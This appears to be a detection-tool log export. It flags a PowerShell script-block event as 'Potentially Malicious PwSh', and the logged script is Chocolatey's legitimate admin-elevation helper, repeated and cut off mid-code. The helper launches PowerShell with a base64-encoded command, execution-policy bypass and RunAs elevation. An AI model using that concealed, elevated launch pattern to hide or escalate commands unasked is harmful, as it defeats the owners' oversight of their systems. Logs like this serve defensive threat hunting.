z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.752 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,65,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = $workingDirectory if ($elevated -and -not $alreadyElevated -and [Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)){ # this doesn't actually currently work - because we are not running under shell execute Write-Debug ""Setting RunAs for elevation"" $process.StartInfo.Verb = ""RunAs"" } if ($minimized) { $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized } $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Write-Debug ""Command [`""$exeToRun`"" $wrappedStatements] exited with `'$exitCode`'."" $exitErrorMessage = '' $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { break } 3010 { break } # NSIS - http://nsis.sourceforge.net/Docs/AppendixD.html # InnoSetup - http://www.jrsoftware.org/ishelp/index.php?topic=setupexitcodes 2 { $exitErrorMessage = 'Setup was cancelled.'; break } 3 { $exitErrorMessage = 'A fatal error occurred when preparing or moving to next install phase. Check to be sure you have enough memory to perform an installation and try again.'; break } 4 { $exitErrorMessage = 'A fatal error occurred during installation process.' + $errorMessageAddendum; break } 5 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 6 { $exitErrorMessage = 'Setup process was forcefully terminated by the debugger.'; break } 7 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation. Please be sure the software can be installed on your system.'; break } 8 { $exitErrorMessage = 'While preparing to install, it was determined setup cannot proceed with the installation until you restart the system. Please reboot and try again.'; break } # MSI - https://msdn.microsoft.com/en-us/library/windows/desktop/aa376931.aspx 1602 { $exitErrorMessage = 'User (you) cancelled the installation.'; break } 1603 { $exitErrorMessage = ""Generic MSI Error. This is a local environment error, not an issue with a package or the MSI itself - it could mean a pending reboot is necessary prior to install or something else (like the same version is already installed). Please see MSI log if available. If not, try again adding `'--install-arguments=`""`'/l*v c:\$($env:chocolateyPackageName)_msi_install.log`'`""`'. Then search the MSI Log for `""Return Value 3`"" and look above that for the error.""; break } 1618 { $exitErrorMessage = 'Another installation currently in progress. Try again later.'; break } 1619 { $exitErrorMessage = 'MSI could not be found - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break } 1620 { $exitErrorMessage = 'MSI could not be opened - it is possibly corrupt or not an MSI at all. If it was downloaded and the MSI is less than 30K, try opening it in an editor like Notepad++ as it is likely HTML.' + $errorMessageAddendum; break }","MessageNumber: 1 ¦ MessageTotal: 3 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: b28016b7-2318-4593-a177-e91b04bf1769 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Start-ChocolateyProcessAsAdmin { <# .SYNOPSIS **NOTE:** Administrative Access Required. Runs a process with administrative privileges. If `-ExeToRun` is not specified, it is run with PowerShell. .NOTES This command will assert UAC/Admin privileges on the machine. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code in the following ways: - 4 if the binary turns out to be a text file. - The same exit code returned from the process that is run. If a 3010 is returned, it will set 3010 for the package. Aliases `Start-ChocolateyProcess` and `Invoke-ChocolateyProcess` available in 0.10.2+. .INPUTS None .OUTPUTS None .PARAMETER Statements Arguments to pass to `ExeToRun` or the PowerShell script block to be run. .PARAMETER ExeToRun The executable/application/installer to run. Defaults to `'powershell'`. .PARAMETER Elevated Indicate whether the process should run elevated. Available in 0.10.2+. .PARAMETER Minimized Switch indicating if a Windows pops up (if not called with a silent argument) that it should be minimized. .PARAMETER NoSleep Used only when calling PowerShell - indicates the window that is opened should return instantly when it is complete. .PARAMETER ValidExitCodes Array of exit codes indicating success. Defaults to `@(0)`. .PARAMETER WorkingDirectory The working directory for the running process. Defaults to `Get-Location`. Available in 0.10.1+. .PARAMETER SensitiveStatements Arguments to pass to `ExeToRun` that are not logged. Note that only licensed versions of Chocolatey provide a way to pass those values completely through without having them in the install script or on the system in some way. Available in 0.10.1+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$msiArgs"" -ExeToRun 'msiexec' .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file .EXAMPLE Start-ChocolateyProcessAsAdmin -Statements ""$silentArgs"" -ExeToRun $file -ValidExitCodes @(0,21) .EXAMPLE > # Run PowerShell statements $psFile = Join-Path ""$(Split-Path -parent $MyInvocation.MyCommand.Definition)"" 'someInstall.ps1' Start-ChocolateyProcessAsAdmin ""& `'$psFile`'"" .EXAMPLE # This also works for cmd and is required if you have any spaces in the paths within your command $appPath = ""$env:ProgramFiles\myapp"" $cmdBatch = ""/c `""$appPath\bin\installmyappservice.bat`"""" Start-ChocolateyProcessAsAdmin $cmdBatch cmd # or more explicitly Start-ChocolateyProcessAsAdmin -Statements $cmdBatch -ExeToRun ""cmd.exe"" .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage #> param( [parameter(Mandatory=$false, Position=0)][string[]] $statements, [parameter(Mandatory=$false, Position=1)][string] $exeToRun = 'powershell', [parameter(Mandatory=$false)][switch] $elevated = $true, [parameter(Mandatory=$false)][switch] $minimized, [parameter(Mandatory=$false)][switch] $noSleep, [parameter(Mandatory=$false)] $validExitCodes = @(0), [parameter(Mandatory=$false)][string] $workingDirectory = $(Get-Location), [parameter(Mandatory=$false)][string] $sensitiveStatements = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) [string]$statements = $statements -join ' ' Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $alreadyElevated = $false if (Test-ProcessAdminRights) { $alreadyElevated = $true } $dbMessagePrepend = ""Elevating permissions and running"" if (!$elevated) { $dbMessagePrepend = ""Running"" } try { if ($exeToRun -ne $null) { $exeToRun = $exeToRun -replace ""`0"", """" } if ($statements -ne $null) { $statements = $statements -replace ""`0"", """" } } catch { Write-Debug ""Removing null characters resulted in an error - $($_.Exception.Message)"" } if ($exeToRun -ne $null) { $exeToRun = $exeToRun.Trim().Trim(""'"").Trim('""') } $wrappedStatements = $statements if ($wrappedStatements -eq $null) { $wrappedStatements = ''} if ($exeToRun -eq 'powershell') { $exeToRun = ""$($env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"" $importChocolateyHelpers = ""& import-module -name '$helpersPath\chocolateyInstaller.psm1' -Verbose:`$false | Out-Null;"" $block = @"" `$noSleep = `$$noSleep #`$env:ChocolateyEnvironmentDebug='false' #`$env:ChocolateyEnvironmentVerbose='false' $importChocolateyHelpers try{ `$progressPreference=""SilentlyContinue"" $statements if(!`$noSleep){start-sleep 6} } catch{ if(!`$noSleep){start-sleep 8} throw } ""@ $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($block)) $wrappedStatements = ""-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -InputFormat Text -OutputFormat Text -EncodedCommand $encoded"" $dbgMessage = @"" $dbMessagePrepend powershell block: $block This may take a while, depending on the statements. ""@ } else { $dbgMessage = @"" $dbMessagePrepend [`""$exeToRun`"" $wrappedStatements]. This may take a while, depending on the statements. ""@ } Write-Debug $dbgMessage $exeIsTextFile = [System.IO.Path]::GetFullPath($exeToRun) + "".istext"" if ([System.IO.File]::Exists($exeIsTextFile)) { Set-PowerShellExitCode 4 throw ""The file was a text file but is attempting to be run as an executable - '$exeToRun'"" } if ($exeToRun -eq 'msiexec' -or $exeToRun -eq 'msiexec.exe') { $exeToRun = ""$($env:SystemRoot)\System32\msiexec.exe"" } if (!([System.IO.File]::Exists($exeToRun)) -and $exeToRun -notmatch 'msiexec') { Write-Warning ""May not be able to find '$exeToRun'. Please use full path for executables."" # until we have search paths enabled, let's just pass a warning #Set-PowerShellExitCode 2 #throw ""Could not find '$exeToRun'"" } # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { Write-Verbose ""$($EventArgs.Data)"" } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null #$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($exeToRun, $wrappedStatements) # in case empty args makes a difference, try to be compatible with the older # version $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.FileName = $exeToRun if ($wrappedStatements -ne '') { $psi.Arguments = ""$wrappedStatements"" } if ($sensitiveStatements -ne $null -and $sensitiveStatements -ne '') { Write-Host ""Sensitive arguments have been passed. Adding to arguments."" $psi.Arguments += "" $sensitiveStatements"" } $process.StartInfo = $psi # process start info $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true 